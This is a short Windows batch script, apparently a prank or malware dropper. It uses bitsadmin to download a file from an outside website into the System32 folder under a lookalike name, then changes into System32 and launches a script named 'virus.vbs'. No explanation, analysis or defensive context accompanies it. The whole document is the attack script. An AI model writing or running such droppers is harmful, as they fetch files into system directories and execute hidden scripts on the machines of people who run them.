@echo off

bitsadmin /transfer myDownloadJob /download /priority high http://wallpapercave.com/wp/wp11484003.jpg %systemroot%\System32\wpll48003.jpg

cd %systemroot%\System32
start virus.vbs